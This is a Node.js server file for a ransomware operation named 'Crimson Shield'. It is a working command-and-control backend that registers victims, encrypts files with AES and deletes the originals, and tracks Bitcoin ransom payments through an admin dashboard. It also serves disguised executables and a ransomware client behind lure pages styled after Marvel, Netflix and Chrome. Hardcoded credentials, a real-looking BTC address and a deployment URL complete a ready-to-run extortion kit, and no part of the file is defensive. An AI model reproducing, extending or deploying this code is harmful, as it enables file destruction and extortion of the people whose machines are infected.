const express = require('express');
const cors = require('cors');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');
const jwt = require('jsonwebtoken');
const { createServer } = require('http');
const { Server } = require('socket.io');

const app = express();
const server = createServer(app);
const io = new Server(server, { cors: { origin: '*' } });
const PORT = process.env.PORT || 3001;

// ===== MIDDLEWARE =====
app.use(cors({
    origin: '*',
    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'Authorization']
}));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

// ===== DEBUG LOGGING =====
app.use((req, res, next) => {
    console.log(`📝 ${req.method} ${req.url}`);
    if (req.method === 'POST') {
        console.log('📦 Body:', req.body);
    }
    next();
});

// ===== DATABASE =====
const VICTIMS_FILE = path.join(__dirname, 'database', 'victims.json');
if (!fs.existsSync(path.join(__dirname, 'database'))) {
    fs.mkdirSync(path.join(__dirname, 'database'), { recursive: true });
}

let victims = [];
if (fs.existsSync(VICTIMS_FILE)) {
    try {
        victims = JSON.parse(fs.readFileSync(VICTIMS_FILE, 'utf8'));
    } catch (e) {
        victims = [];
    }
}

function saveVictims() {
    fs.writeFileSync(VICTIMS_FILE, JSON.stringify(victims, null, 2));
}

// ===== ENCRYPTION ENGINE =====
class EncryptionEngine {
    constructor() {
        const keyString = process.env.ENCRYPTION_KEY || 'CRIMSON@CRYPT%09';
        this.key = crypto.createHash('sha256').update(keyString).digest();
        this.iv = crypto.randomBytes(16);
    }

    encryptFile(filePath) {
        try {
            const data = fs.readFileSync(filePath);
            const cipher = crypto.createCipheriv('aes-256-cbc', this.key, this.iv);
            const encrypted = Buffer.concat([cipher.update(data), cipher.final()]);
            const encryptedPath = filePath + '.crimson';
            fs.writeFileSync(encryptedPath, encrypted);
            fs.unlinkSync(filePath);
            return encryptedPath;
        } catch (error) {
            throw new Error(`Encryption failed: ${error.message}`);
        }
    }

    decryptFile(filePath) {
        try {
            const data = fs.readFileSync(filePath);
            const decipher = crypto.createDecipheriv('aes-256-cbc', this.key, this.iv);
            const decrypted = Buffer.concat([decipher.update(data), decipher.final()]);
            const originalPath = filePath.replace('.crimson', '');
            fs.writeFileSync(originalPath, decrypted);
            fs.unlinkSync(filePath);
            return originalPath;
        } catch (error) {
            throw new Error(`Decryption failed: ${error.message}`);
        }
    }

    getKey() {
        return {
            key: this.key.toString('hex'),
            iv: this.iv.toString('hex')
        };
    }
}

const encryptionEngine = new EncryptionEngine();

// ============================================
// ===== ROUTES =====
// ============================================

// ===== PUBLIC ROUTES =====
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'marvel.html'));
});

app.get('/marvel', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'marvel.html'));
});

app.get('/netflix', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'netflix.html'));
});

app.get('/chrome', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'chrome.html'));
});

app.get('/dashboard', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
});

app.get('/kiosk', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'kiosk.html'));
});

// ============================================
// ===== ADMIN LOGIN =====
// ============================================

app.post('/api/admin/login', (req, res) => {
    console.log('🔐 ===== LOGIN ATTEMPT =====');
    console.log('📦 Request body:', req.body);
    
    // HARDCODED CREDENTIALS
    const validUsername = 'admin';
    const validPassword = 'crimsonadmin';
    
    const { username, password } = req.body || {};
    
    if (username === validUsername && password === validPassword) {
        console.log('✅ LOGIN SUCCESS!');
        const token = jwt.sign(
            { admin: true, username: username },
            'fallback_secret_key_12345',
            { expiresIn: '24h' }
        );
        return res.json({ 
            success: true, 
            token: token 
        });
    } else {
        console.log('❌ LOGIN FAILED!');
        return res.status(401).json({ 
            error: 'Invalid credentials'
        });
    }
});

// ============================================
// ===== ADMIN ROUTES =====
// ============================================

// Middleware to verify admin token
function verifyAdmin(req, res, next) {
    const token = req.headers['authorization'];
    if (!token) {
        return res.status(401).json({ error: 'Unauthorized - No token' });
    }
    try {
        const decoded = jwt.verify(token.replace('Bearer ', ''), 'fallback_secret_key_12345');
        req.admin = decoded;
        next();
    } catch (error) {
        return res.status(401).json({ error: 'Invalid token' });
    }
}

app.get('/api/admin/dashboard', verifyAdmin, (req, res) => {
    const totalVictims = victims.length;
    const paidVictims = victims.filter(v => v.paid).length;
    const totalBTC = victims.reduce((sum, v) => sum + (v.paid ? 0.5 : 0), 0);
    
    res.json({
        totalVictims,
        paidVictims,
        totalBTC: totalBTC.toFixed(2),
        recentVictims: victims.slice(-5).reverse(),
        activeVictims: victims.filter(v => !v.paid && !v.decrypted).length
    });
});

app.get('/api/admin/victims', verifyAdmin, (req, res) => {
    res.json(victims);
});

app.get('/api/admin/victim/:id', verifyAdmin, (req, res) => {
    const victim = victims.find(v => v.id === req.params.id);
    if (!victim) {
        return res.status(404).json({ error: 'Victim not found' });
    }
    res.json(victim);
});

app.post('/api/admin/check-payment', verifyAdmin, async (req, res) => {
    const { victimId } = req.body;
    const victim = victims.find(v => v.id === victimId);
    
    if (!victim) {
        return res.status(404).json({ error: 'Victim not found' });
    }

    // Simulate payment check (replace with actual BTC API)
    const paid = victim.paid || false;
    
    if (paid && !victim.paid) {
        victim.paid = true;
        victim.paidAt = new Date().toISOString();
        saveVictims();
        io.emit('payment_confirmed', { victimId: victim.id });
    }

    res.json({
        paid: victim.paid || false,
        victimId: victim.id
    });
});

app.post('/api/admin/generate-key', verifyAdmin, (req, res) => {
    const { victimId } = req.body;
    const victim = victims.find(v => v.id === victimId);
    
    if (!victim) {
        return res.status(404).json({ error: 'Victim not found' });
    }

    if (!victim.paid) {
        return res.status(400).json({ error: 'Victim has not paid' });
    }

    const decryptionKey = crypto.randomBytes(32).toString('hex');
    victim.decryptionKey = decryptionKey;
    victim.decrypted = true;
    victim.decryptedAt = new Date().toISOString();
    saveVictims();

    res.json({
        success: true,
        victimId: victim.id,
        decryptionKey: decryptionKey
    });
});

// ============================================
// ===== DOWNLOAD ROUTES - ALL VERSIONS =====
// ============================================

// Windows 64-bit
app.get('/download/CrimsonShield_x64.exe', (req, res) => {
    const exePath = path.join(__dirname, 'builder', 'CrimsonShield_x64.exe');
    if (fs.existsSync(exePath)) {
        res.download(exePath, 'CrimsonShield_x64.exe');
    } else {
        res.status(404).send('❌ 64-bit Windows version not found. Please build it first.');
    }
});

// Windows 32-bit
app.get('/download/CrimsonShield_x86.exe', (req, res) => {
    const exePath = path.join(__dirname, 'builder', 'CrimsonShield_x86.exe');
    if (fs.existsSync(exePath)) {
        res.download(exePath, 'CrimsonShield_x86.exe');
    } else {
        res.status(404).send('❌ 32-bit Windows version not found. Please build it first.');
    }
});

// Windows ARM64
app.get('/download/CrimsonShield_arm64.exe', (req, res) => {
    const exePath = path.join(__dirname, 'builder', 'CrimsonShield_arm64.exe');
    if (fs.existsSync(exePath)) {
        res.download(exePath, 'CrimsonShield_arm64.exe');
    } else {
        res.status(404).send('❌ ARM64 Windows version not found. Please build it first.');
    }
});

// Mac
app.get('/download/CrimsonShield_mac', (req, res) => {
    const exePath = path.join(__dirname, 'builder', 'CrimsonShield_mac');
    if (fs.existsSync(exePath)) {
        res.download(exePath, 'CrimsonShield_mac');
    } else {
        res.status(404).send('❌ Mac version not found. Please build it first.');
    }
});

// Linux
app.get('/download/CrimsonShield_linux', (req, res) => {
    const exePath = path.join(__dirname, 'builder', 'CrimsonShield_linux');
    if (fs.existsSync(exePath)) {
        res.download(exePath, 'CrimsonShield_linux');
    } else {
        res.status(404).send('❌ Linux version not found. Please build it first.');
    }
});

// Universal download (default to x64)
app.get('/download/CrimsonShield.exe', (req, res) => {
    const exePath = path.join(__dirname, 'builder', 'CrimsonShield_x64.exe');
    if (fs.existsSync(exePath)) {
        res.download(exePath, 'CrimsonShield.exe');
    } else {
        res.status(404).send('❌ EXE not found. Please build it first.');
    }
});

// Download ransomware client
app.get('/download/ransomware.js', (req, res) => {
    const clientPath = path.join(__dirname, 'client', 'ransomware.js');
    if (fs.existsSync(clientPath)) {
        res.download(clientPath, 'crimson.js');
    } else {
        res.status(404).send('❌ Client not found');
    }
});

// ============================================
// ===== CLIENT ROUTES =====
// ============================================

app.post('/api/register-victim', (req, res) => {
    const { systemInfo, filesEncrypted } = req.body;
    
    const victim = {
        id: crypto.randomBytes(8).toString('hex'),
        btcAddress: 'bc1qnjkxvj7avmet54w9rmzf0ldftwzh2fcwsdxuw7',
        encryptionKey: encryptionEngine.getKey(),
        systemInfo: systemInfo || {},
        filesEncrypted: filesEncrypted || 0,
        registeredAt: new Date().toISOString(),
        paid: false,
        paidAt: null,
        decrypted: false,
        decryptedAt: null,
        decryptionKey: null
    };
    
    victims.push(victim);
    saveVictims();
    io.emit('new_victim', victim);
    
    console.log(`🆕 New victim registered: ${victim.id}`);
    console.log(`   Files encrypted: ${victim.filesEncrypted}`);
    console.log(`   System: ${victim.systemInfo?.hostname || 'Unknown'}`);
    
    res.json({
        success: true,
        victimId: victim.id,
        btcAddress: victim.btcAddress,
        ransomAmount: 0.5
    });
});

app.post('/api/encrypt', (req, res) => {
    const { filePath } = req.body;
    if (!filePath || !fs.existsSync(filePath)) {
        return res.status(400).json({ error: 'File not found' });
    }

    try {
        const encryptedPath = encryptionEngine.encryptFile(filePath);
        res.json({ success: true, encryptedPath });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

app.post('/api/decrypt', (req, res) => {
    const { filePath, decryptionKey } = req.body;
    
    if (!filePath || !fs.existsSync(filePath)) {
        return res.status(400).json({ error: 'File not found' });
    }

    const victim = victims.find(v => v.decryptionKey === decryptionKey);
    if (!victim) {
        return res.status(403).json({ error: 'Invalid decryption key' });
    }

    try {
        const originalPath = encryptionEngine.decryptFile(filePath);
        res.json({ success: true, originalPath });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// ============================================
// ===== TEST ROUTES =====
// ============================================

app.get('/api/health', (req, res) => {
    res.json({
        status: '💀 Crimson Shield Active',
        totalVictims: victims.length,
        timestamp: new Date().toISOString(),
        version: '2.0.0'
    });
});

app.get('/api/test', (req, res) => {
    res.json({
        message: '✅ Server is running!',
        port: PORT,
        victimsCount: victims.length,
        platform: process.platform,
        nodeVersion: process.version,
        timestamp: new Date().toISOString()
    });
});

// ============================================
// ===== WEBSOCKET =====
// ============================================

io.on('connection', (socket) => {
    console.log('🔌 Client connected:', socket.id);
    
    socket.emit('connected', { 
        message: 'Connected to Crimson Shield Server',
        timestamp: new Date().toISOString()
    });

    socket.on('disconnect', () => {
        console.log('🔌 Client disconnected:', socket.id);
    });
});

// ============================================
// ===== START SERVER =====
// ============================================

server.listen(PORT, '0.0.0.0', () => {
    const btcAddress = 'bc1qnjkxvj7avmet54w9rmzf0ldftwzh2fcwsdxuw7';
    console.log('╔═══════════════════════════════════════════╗');
    console.log('║     🔴 CRIMSON SHIELD RANSOMWARE 🔴       ║');
    console.log('╠═══════════════════════════════════════════╣');
    console.log(`║  Server:    http://0.0.0.0:${PORT}         ║`);
    console.log(`║  Dashboard: http://0.0.0.0:${PORT}/dashboard ║`);
    console.log(`║  Victims:   ${String(victims.length).padEnd(20)}    ║`);
    console.log(`║  BTC Addr:  ${btcAddress.substring(0, 20)}...  ║`);
    console.log(`║  Status:    ${'🟢 ONLINE'.padEnd(20)}    ║`);
    console.log('╚═══════════════════════════════════════════╝');
    console.log('💀 Ready to infect!');
    console.log(`📍 https://crimson-production-d9ad.up.railway.app`);
});

// ===== ERROR HANDLING =====
process.on('uncaughtException', (err) => {
    console.error('💥 Uncaught Exception:', err);
});

process.on('unhandledRejection', (err) => {
    console.error('💥 Unhandled Rejection:', err);
});
